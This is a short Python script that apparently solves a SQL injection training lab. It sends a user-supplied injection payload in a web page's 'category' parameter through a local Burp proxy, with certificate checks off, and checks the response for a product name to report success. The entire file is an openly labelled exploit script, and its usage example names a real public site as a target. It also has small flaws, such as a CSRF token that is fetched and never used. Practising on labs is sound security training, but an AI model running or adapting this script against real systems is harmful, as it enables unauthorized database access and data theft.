import sys

import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings()

# let the script go through the burp suite proxy
# for debuging purposes
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def get_csrf_token(session, base_url):
    r = session.get(base_url, proxies=proxies, verify=False, timeout=5)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf = soup.find("input")["value"]
    return csrf


def exploit_sqli(session, base_url, payload_entered):
    # this time we want to URL encode the params:
    crf = get_csrf_token(session, base_url)
    params = {"category": payload_entered}

    r = requests.get(base_url, params=params, proxies=proxies, verify=False, timeout=5)
    print(r.text)
    if "Waterproof Tea Bags" in r.text:
        return True
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()

    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url> <payload>")
        print(f'[-] Example: {sys.argv[0]} www.google.com" "1=1"')
        sys.exit(-1)

    s = requests.Session()

    if exploit_sqli(s, url, payload):
        print("[+] Exploit successful")
    else:
        print("[-] Exploit failed")
